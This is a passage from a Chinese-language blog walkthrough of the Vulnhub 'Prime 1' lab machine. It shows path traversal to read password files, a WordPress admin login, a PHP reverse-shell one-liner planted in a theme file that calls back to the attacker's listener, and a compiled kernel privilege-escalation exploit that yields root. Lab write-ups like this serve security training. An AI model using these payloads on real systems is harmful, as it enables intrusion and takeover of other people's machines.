class=\"hljs-number\">1000</span>:<span class=\"hljs-number\">1000</span>:victor,,,:/home/victor:/bin/bash \nmysql:x:<span class=\"hljs-number\">121</span>:<span class=\"hljs-number\">129</span>:MySQL Server,,,:/nonexistent:/bin/<span class=\"hljs-literal\">false</span> \nsaket:x:<span class=\"hljs-number\">1001</span>:<span class=\"hljs-number\">1001</span>:find password.txt file in my directory:/home/saket: \nsshd:x:<span class=\"hljs-number\">122</span>:<span class=\"hljs-number\">65534</span>::/<span class=\"hljs-keyword\">var</span>/run/sshd:/usr/sbin/nologin \n</code></pre>\n<p>发现<code>saket:x:1001:1001:find password.txt file in my directory:/home/saket:</code> ，好好好</p>\n<pre><code class=\"hljs language-php\">http:<span class=\"hljs-comment\">//192.168.75.137/image.php?secrettier360=../../../home/saket/password.txt</span>\n<span class=\"hljs-comment\">//</span>\nfinaly you got the right parameter\n\nfollow_the_ippsec \n</code></pre>\n<p>密码应该是<code>follow_the_ippsec</code></p>\n</li>\n<li>\n<p>登录wordpress后台，用户名<code>victor</code>，密码<code>follow_the_ippsec</code></p>\n<p>为什么用户名是<code>victor</code> ，因为<code>wordpress/index.php</code>里面第一条信息就是<code>victor</code> 发布的，所以猜测用户名是<code>victor</code> ，成功进入后台</p>\n</li>\n</ol>\n<h2>后台利用获得初级shell</h2>\n<ol>\n<li>\n<p>进入后台，<code>plugins</code> → <code>Add New</code> → <code>upload plugins</code> ,上传反弹shell文件</p>\n<p><img src=\"/post-images/VulnhubPrime%201/image14.png\" alt=\"image.png\"></p>\n<p>发现没有上传权限，即使设置关闭了以月份创建文件夹</p>\n</li>\n<li>\n<p>寻找别的地方上传shellcode</p>\n<p>在<code>Appearance</code>→<code>Theme Editor</code> →<code>secret.php</code> 找到了可编辑保存的文件</p>\n<p>我们将shellcode输进去</p>\n<pre><code class=\"hljs language-php\"><span class=\"hljs-meta\">&#x3C;?php</span> <span class=\"hljs-title function_ invoke__\">exec</span>(<span class=\"hljs-string\">\"/bin/bash -c 'bash -i >&#x26; /dev/tcp/192.168.75.131/1234 0>&#x26;1'\"</span>);<span class=\"hljs-meta\">?></span>\n</code></pre>\n<p>然后<code>save</code></p>\n</li>\n<li>\n<p>kali开启监听，并且访问</p>\n<pre><code class=\"hljs language-php\">http:<span class=\"hljs-comment\">//192.168.75.137/wordpress/wp-content/themes/twentynineteen/secret.php</span>\n</code></pre>\n<pre><code class=\"hljs language-php\">nc -lvp <span class=\"hljs-number\">1234</span>                          \nlistening on [any] <span class=\"hljs-number\">1234</span> ...\n<span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.137</span>: inverse host lookup failed: Unknown host\nconnect to [<span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.131</span>] <span class=\"hljs-keyword\">from</span> (UNKNOWN) [<span class=\"hljs-number\">192.168</span>.<span class=\"hljs-number\">75.137</span>] <span class=\"hljs-number\">42312</span>\nbash: cannot set terminal process <span class=\"hljs-title function_ invoke__\">group</span> (<span class=\"hljs-number\">48712</span>): Inappropriate ioctl <span class=\"hljs-keyword\">for</span> device\nbash: no job control in this shell\nwww-data@ubuntu:/<span class=\"hljs-keyword\">var</span>/www/html/wordpress/wp-content/themes/twentynineteen$ \n</code></pre>\n<p>获得初级shell</p>\n</li>\n</ol>\n<h2>提权</h2>\n<ol>\n<li>\n<p>查看权限</p>\n<pre><code class=\"hljs language-php\">www-data@ubuntu:/<span class=\"hljs-keyword\">var</span>/www/html/wordpress/wp-content/themes/twentynineteen$ sudo -l                    \nMatching Defaults entries <span class=\"hljs-keyword\">for</span> www-data on ubuntu:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\nUser www-data may run the following commands on ubuntu:\n    (root) NOPASSWD: /home/saket/enc\n<span class=\"hljs-comment\">//</span>\nwww-data@ubuntu:/<span class=\"hljs-keyword\">var</span>/www/html/wordpress/wp-content/themes/twentynineteen$ uname -a              \nLinux ubuntu <span class=\"hljs-number\">4.10</span>.<span class=\"hljs-number\">0</span>-<span class=\"hljs-number\">28</span>-generic <span class=\"hljs-comment\">#32~16.04.2-Ubuntu SMP Thu Jul 20 10:19:48 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux</span>\n</code></pre>\n<p><code>www-data</code> 用户被授予了在 Ubuntu 系统上以 <code>root</code> 权限运行 <code>/home/saket/enc</code> 命令，而无需输入密码</p>\n<p><strong><code>/home/saket/enc</code></strong>：这是一个具体的可执行文件或脚本的路径，<code>www-data</code> 用户可以以 <code>root</code> 身份执行它</p>\n<p>但是<code>enc</code>发现执行时还是需要输入密码，尝试利用别的</p>\n</li>\n<li>\n<p>尝试内核漏洞</p>\n<pre><code class=\"hljs language-php\">searchsploit linux kernel <span class=\"hljs-number\">4.10</span>.<span class=\"hljs-number\">0</span>-<span class=\"hljs-number\">28</span> | grep <span class=\"hljs-string\">'Local Privilege'</span>\nLinux <span class=\"hljs-title function_ invoke__\">Kernel</span> (Solaris <span class=\"hljs-number\">10</span> / &#x3C; <span class=\"hljs-number\">5.10</span> <span class=\"hljs-number\">138888</span>-<span class=\"hljs-number\">01</span>) - Local Privilege Escalation                                 | solaris/local/<span class=\"hljs-number\">15962</span>.c\nLinux Kernel <span class=\"hljs-number\">2.6</span>.<span class=\"hljs-number\">19</span> &#x3C; <span class=\"hljs-number\">5.9</span> - <span class=\"hljs-string\">'Netfilter Local Privilege Escalation                                         | linux/local/50135.c\nLinux Kernel 4.10 &#x3C; 5.1.17 - '</span>PTRACE_TRACEME<span class=\"hljs-string\">' pkexec Local Privilege Escalation                           | linux/local/47163.c\nLinux Kernel 4.8.0 UDEV &#x3C; 232 - Local Privilege Escalation                                                | linux/local/41886.c\nLinux Kernel &#x3C; 4.11.8 - '</span>mq_notify: <span class=\"hljs-keyword\">double</span> <span class=\"hljs-title function_ invoke__\">sock_put</span>()<span class=\"hljs-string\">' Local Privilege Escalation                         | linux/local/45553.c\nLinux Kernel &#x3C; 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation                             | linux/local/45010.c\n</span></code></pre>\n<p>尝试最后一个 <code>45010.c</code> 然后把<code>45010.c</code>传到靶机，编译运行,记得给<code>执行</code>权限</p>\n<pre><code class=\"hljs language-php\">gcc <span class=\"hljs-number\">45010</span>.c -o <span class=\"hljs-number\">45010</span>\nchmod u+x <span class=\"hljs-number\">45010</span>\n./<span class=\"hljs-number\">45010</span>\n</code></pre>\n<pre><code class=\"hljs language-php\">www-data@ubuntu:/tmp$ ./<span class=\"hljs-number\">45010</span>\n<span class=\"hljs-comment\">//</span>\nuname -a\nLinux ubuntu <span class=\"hljs-number\">4.10</span>.<span class=\"hljs-number\">0</span>-<span class=\"hljs-number\">28</span>-generic <span class=\"hljs-comment\">#32~16.04.2-Ubuntu SMP Thu Jul 20 10:19:48 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux</span>\n<span class=\"hljs-comment\">//</span>\nwhoami \nroot\n</code></pre>\n<p>提权成功，读取flag文件</p>\n<pre><code class=\"hljs language-php\">python -c <span class=\"hljs-string\">\"import pty;pty.spawn('/bin/bash')\"</span>    \n<span class=\"hljs-comment\">//</span>\nroot@ubuntu:/tmp<span class=\"hljs-comment\"># cd /root</span>\nroot@ubuntu:/root<span class=\"hljs-comment\"># ls</span>\nenc  enc.cpp  enc.txt  key.txt  root.txt  sql.py  t.sh  wfuzz  wordpress.sql\n<span class=\"hljs-comment\">//</span>\nroot@ubuntu:/root<span class=\"hljs-comment\"># cat key.txt</span>\n</code></pre>\n<pre><code class=\"hljs language-php\">I know you are the fan of ippsec.\n\nSo convert <span class=\"hljs-keyword\">string</span> <span class=\"hljs-string\">\"ippsec\"</span> into md5 hash <span class=\"hljs-keyword\">and</span> <span class=\"hljs-keyword\">use</span> <span class=\"hljs-title\">it</span> <span class=\"hljs-title\">to</span> <span class=\"hljs-title\">gain</span> <span class=\"hljs-title\">yourself</span> <span class=\"hljs-title\">in</span> <span class=\"hljs-title\">your</span> <span class=\"hljs-title\">real</span> <span class=\"hljs-title\">form</span>.\n</code></pre>\n</li>\n</ol>","title":"Vulnhub - Prime 1","date":"2025-04-02","updated":"2025-04-02","comments":true,"tags":["Vulnhub"],"categories":"靶机","description":"Prime 1\n\n \n \n\n主机发现端口扫描\n\n1. 探测存活主机，137是靶机\n    \n    \n    \n2. 扫描靶机所有开放端口\n    \n    \n    \n3. 扫描服务版本及系统版本\n    \n    \n    \n4. udp扫描\n    \n    \n    \n5. 扫描漏洞\n    \n    \n    \n    扫描出 `slowloris DOS`用不上，以及`cve2017-..."},"recentPosts":[{"id":"HackMyVMXimai","title":"HackMyVM - Ximai","date":"2025-07-14","isEncrypted":false,"year":"2025","month":"07","day":"14"},{"id":"HackTheBoxSeason8 - Outbound","title":"HackTheBox - Season8 - Outbound","date":"2025-07-13","isEncrypted":true,"year":"2025","month":"07","day":"13"},{"id":"HackTheBoxSeason8 - Voleur","title":"HackTheBox - Season8 - Voleur","date":"2025-07-07","isEncrypted":true,"year":"2025","month":"07","day":"07"},{"id":"TryHackMeCreative","title":"TryHackMe - Creative","date":"2025-07-05","isEncrypted":false,"year":"2025","month":"07","day":"05"},{"id":"HackTheBoxSeason8 - RustyKey","title":"HackTheBox - Season8 - RustyKey","date":"2025-06-30","isEncrypted":true,"year":"2025","month":"06","day":"30"},{"id":"HackTheBoxSeason8 - Artificial","title":"HackTheBox - Season8 - Artificial","date":"2025-06-28","isEncrypted":true,"year":"2025","month":"06","day":"28"},{"id":"HackTheBoxMachine - Developer","title":"HackTheBox - Machine - Developer","date":"2025-06-22","isEncrypted":false,"year":"2025","month":"06","day":"22"}]},"__N_SSG":true}